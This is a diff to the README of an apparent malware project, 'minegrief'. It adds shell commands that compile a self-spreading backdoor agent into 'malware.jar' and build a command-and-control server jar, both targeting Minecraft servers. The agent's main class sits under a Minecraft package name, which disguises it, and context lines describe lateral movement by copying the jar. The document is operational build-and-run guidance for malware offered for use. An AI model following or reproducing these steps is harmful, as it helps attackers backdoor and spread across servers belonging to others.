@@ -30,10 +30,40 @@ Works on Java 8 and above.
 ## Notes
 Lateral movement modules require minegriefagent to be built as a jar file, as modules will copy itself over in a jar to spread.
 
-I used this script to create the agent jarfile, including any requried dependencies
+### To build the agent jarfile
+Download jsch to the root directory of the repository
 ```bash
-
+wget https://repo1.maven.org/maven2/com/github/mwiede/jsch/0.2.17/jsch-0.2.17.jar
+unzip jsch-0.2.17.jar
 ```
+
+Make the jarfile
+```bash
+find minegriefagent -name '*.java' > sources.txt
+<JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
+cp -r com/jcraft build-manual/com
+echo 'Manifest-Version: 1.0\nMain-Class: net.minecraft.bundler.Backdoor\nBundler-Format: 1.0' > manifest.txt
+<JAVA 1.8 DIR>/bin/jar cvfm malware.jar manifest.txt -C build-manual .
+```
+
+Run it
+```bash
+<JAVA 1.8 DIR>/bin/java -jar malware.jar
+```
+
+### To build the server jarfile
+```bash
+find minegriefserver -name '*.java' > sources.txt
+<JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
+echo 'Manifest-Version: 1.0\nMain-Class: com.chebuya.minegriefserver.Main\nBundler-Format: 1.0' > manifest.txt
+<JAVA 1.8 DIR>/bin/jar cvfm c2-server.jar manifest.txt -C build-manual .
+```
+
+Run it
+```bash
+<JAVA 1.8 DIR>/bin/java -jar c2-server.jar
+```
+
 
 ## Targeting
 Minecraft servers will always have Java installed so we don't have to worry about installing it ourselves.
